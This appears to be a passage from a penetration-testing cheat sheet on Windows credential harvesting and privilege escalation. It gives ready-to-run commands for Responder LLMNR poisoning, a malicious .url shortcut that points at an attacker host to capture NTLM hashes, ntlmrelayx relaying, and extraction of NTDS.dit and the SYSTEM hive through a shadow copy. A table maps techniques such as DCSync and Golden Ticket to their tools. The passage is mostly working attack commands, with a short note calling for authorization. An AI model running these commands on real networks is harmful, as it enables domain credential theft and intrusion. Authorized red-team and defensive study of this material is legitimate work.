# Credential Harvesting

#### LLMNR Poisoning

```bash
# Start Responder
responder -I eth1 -v

# Create malicious shortcut (Book.url)
[InternetShortcut]
URL=https://facebook.com
IconIndex=0
IconFile=\\attacker_ip\not_found.ico
```

#### NTLM Relay

```bash
responder -I eth1 -v
ntlmrelayx.py -tf targets.txt -smb2support
```

#### Dumping with VSS

```powershell
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\
```

---

## Quick Reference

| Technique | OS | Domain Required | Tool |
|-----------|-----|-----------------|------|
| Sudo Binary Abuse | Linux | No | GTFOBins |
| Cron Job Exploit | Linux | No | Manual |
| Capability Abuse | Linux | No | getcap |
| NFS no_root_squash | Linux | No | mount |
| Token Impersonation | Windows | No | SweetPotato |
| Service Abuse | Windows | No | PowerUp |
| Kerberoasting | Windows | Yes | Rubeus/Impacket |
| AS-REP Roasting | Windows | Yes | Rubeus |
| Golden Ticket | Windows | Yes | Mimikatz |
| Pass-the-Ticket | Windows | Yes | Rubeus |
| DCSync | Windows | Yes | Mimikatz |
| LLMNR Poisoning | Windows | Yes | Responder |

---

## Constraints

**Must:**
- Have initial shell access before attempting escalation
- Verify target OS and environment before selecting technique
- Use appropriate tool for domain vs local escalation

**Must Not:**
- Attempt techniques on production systems without authorization
- Leave persistence mechanisms without client approval
- Ignore detection mechanisms (EDR, SIEM)

**Should:**
- Enumerate thoroughly before exploitation
- Document all successful escalation paths
- Clean up artifacts after engagement

---

## Examples